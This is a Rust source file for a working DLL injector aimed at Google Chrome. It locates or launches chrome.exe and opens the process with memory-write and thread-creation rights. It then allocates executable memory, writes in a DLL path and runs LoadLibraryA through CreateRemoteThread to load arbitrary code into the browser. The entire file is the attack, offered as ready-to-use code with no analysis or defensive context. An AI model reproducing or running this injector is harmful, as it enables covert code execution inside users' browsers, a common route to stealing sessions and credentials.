use std::process::Command;
use std::ffi::c_void;

// Windows API imports
use windows::core::s;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, 
    PROCESSENTRY32, TH32CS_SNAPPROCESS
};
use windows::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, 
    PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD
};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx
};

fn main() {
    let pid = if let Some(pid) = is_chrome_running() {
        println!("chrome.exe is already running with PID: {}", pid);
        pid
    } else {
        println!("chrome.exe is not running, launching it...");
        if let Some(pid) = launch_chrome_and_get_pid() {
            println!("Successfully launched chrome.exe with PID: {}", pid);
            pid
        } else {
            println!("Failed to launch chrome.exe or get its PID");
            return;
        }
    };

    // Open the process with necessary permissions
    let h_process = unsafe { 
        OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, 
            false, 
            pid
        ) 
    };
    let h_process = match h_process {
        Ok(h) => {
            println!("[+] Got handle to process ID {}, handle: {:?}", pid, h);
            h
        },
        Err(e) => {
            panic!("[-] Could not get handle to pid {}, error: {}", pid, e);
        }
    };

    // handle kernel32.dll
    let h_kernel32 = unsafe { GetModuleHandleA(s!("kernel32.dll")) };
    let h_kernel32 = match h_kernel32 {
        Ok(h) => {
            println!("[+] Handle to kernel32.dll: {:?}", h);
            h
        }
        Err(e) => panic!("[-] Could not get handle to kernel32.dll, {}", e),
    };

    // LoadLibraryA
    let load_library_fn_address = unsafe { GetProcAddress(h_kernel32, s!("LoadLibraryA")) };
    let load_library_fn_address = match load_library_fn_address {
        None => panic!("[-] Could not resolve the address of LoadLibraryA."),
        Some(address) => {
            println!("[+] Address of LoadLibraryA: {:p}", address);
            address
        }
    };


    let path_to_dll = "C:\\Users\\chmod\\Desktop\\Rust_injector\\mydll.dll\0"; // enter the correct path to your DLL 
    let dll_path_bytes = path_to_dll.as_bytes();

    // Allocate memory in the remote process for the DLL path
    let remote_buffer_base_address = unsafe {
        VirtualAllocEx(
            h_process,
            None,
            dll_path_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if remote_buffer_base_address.is_null() {
        panic!("[-] Failed allocating memory into remote process for DLL Path");
    }
    println!("[+] Remote buffer base address: {:p}", remote_buffer_base_address);

    // Write the DLL path into the remote process's memory
    let mut bytes_written: usize = 0;
    let write_result = unsafe {
        WriteProcessMemory(
            h_process,
            remote_buffer_base_address,
            dll_path_bytes.as_ptr() as *const c_void,
            dll_path_bytes.len(),
            Some(&mut bytes_written as *mut usize),
        )
    };

    match write_result {
        Ok(_) => println!("[+] Bytes written to remote process: {}", bytes_written),
        Err(e) => panic!("[-] Error writing remote process memory: {}", e),
    }

    // thread for the DLL injection
    let mut thread_id: u32 = 0;
    let h_thread = unsafe {
        CreateRemoteThread(
            h_process,
            None,
            0,
            Some(std::mem::transmute(load_library_fn_address)),
            Some(remote_buffer_base_address),
            0,
            Some(&mut thread_id as *mut u32),
        )
    };

    match h_thread {
        Ok(h) => {
            println!("[+] Thread created successfully, handle: {:?}, thread ID: {}", h, thread_id);
            println!("[+] DLL injection initiated!");
            
            // close handles
            unsafe {
                let _ = CloseHandle(h);
                let _ = CloseHandle(h_process);
            }
        }
        Err(e) => panic!("[-] Error occurred creating thread: {}", e),
    }
}

fn is_chrome_running() -> Option<u32> {
    find_process_pid("chrome.exe")
}

fn launch_chrome_and_get_pid() -> Option<u32> {
    let mut command = Command::new("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");

    match command.spawn() {
        Ok(_child) => {
            // Wait a moment for the process to start
            std::thread::sleep(std::time::Duration::from_millis(500));
            // Find its PID using CreateToolhelp32Snapshot
            find_process_pid("chrome.exe")
        }
        Err(e) => {
            println!("Failed to launch chrome.exe: {}", e);
            None
        }
    }
}

fn find_process_pid(process_name: &str) -> Option<u32> {
    unsafe {
        let snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(handle) => handle,
            Err(_) => return None,
        };

        let mut pe32 = PROCESSENTRY32 {
            dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };

        if Process32First(snapshot, &mut pe32).is_err() {
            let _ = CloseHandle(snapshot);
            return None;
        }

        let target_name = process_name.to_lowercase();
        loop {
            // szExeFile is [i8; 260], convert to bytes then to string
            let len = pe32
                .szExeFile
                .iter()
                .position(|&c| c == 0)
                .unwrap_or(pe32.szExeFile.len());

            // Convert [i8] to [u8] then to string
            let bytes: &[u8] = unsafe {
                std::slice::from_raw_parts(pe32.szExeFile.as_ptr() as *const u8, len)
            };
            let current_name = String::from_utf8_lossy(bytes).to_lowercase();

            if current_name == target_name {
                let pid = pe32.th32ProcessID;
                let _ = CloseHandle(snapshot);
                return Some(pid);
            }

            if Process32Next(snapshot, &mut pe32).is_err() {
                break;
            }
        }

        let _ = CloseHandle(snapshot);
        None
    }
}